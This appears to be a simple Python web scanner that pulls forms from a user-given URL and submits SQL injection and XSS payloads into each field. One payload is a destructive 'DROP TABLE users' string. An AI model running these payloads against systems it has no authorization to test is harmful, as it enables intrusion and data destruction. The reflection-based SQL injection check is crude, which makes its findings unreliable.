import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# Common payloads for SQL Injection and XSS testing
sql_payloads = ["' OR '1'='1", "'; DROP TABLE users; --", "' OR 'a'='a"]
xss_payloads = ["<script>alert('XSS')</script>", '"><img src=x onerror=alert(1)>']

def get_forms(url):
    """Extracts all form tags from the given URL."""
    response = requests.get(url)
    soup = BeautifulSoup(response.content, "html.parser")
    return soup.find_all("form")

def form_details(form):
    """Extracts form details: action, method, and inputs."""
    details = {
        "action": form.attrs.get("action", "").lower(),
        "method": form.attrs.get("method", "get").lower(),
        "inputs": []
    }

    for input_tag in form.find_all(["input", "textarea"]):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        if input_name:  # Skip inputs without a name
            details["inputs"].append({"type": input_type, "name": input_name})
    
    return details

def test_vulnerability(url, payloads, vuln_type):
    """Tests for vulnerabilities by injecting payloads into forms."""
    forms = get_forms(url)
    print(f"[+] Testing {len(forms)} forms on {url} for {vuln_type}...")

    for form in forms:
        details = form_details(form)
        target_url = urljoin(url, details["action"])
        
        for payload in payloads:
            data = {input_tag["name"]: payload for input_tag in details["inputs"]}
            
            if details["method"] == "post":
                response = requests.post(target_url, data=data)
            else:
                response = requests.get(target_url, params=data)

            if payload.lower() in response.text.lower():  # Case-insensitive match
                print(f"[!] {vuln_type} detected on {target_url} using payload: {payload}")
                break  # Stop after finding one vulnerability

def main():
    target_url = input("Enter the target URL: ").strip()
    
    # Test for SQL Injection
    test_vulnerability(target_url, sql_payloads, "SQL Injection")
    
    # Test for XSS
    test_vulnerability(target_url, xss_payloads, "Cross-Site Scripting (XSS)")

if __name__ == "__main__":
    main()
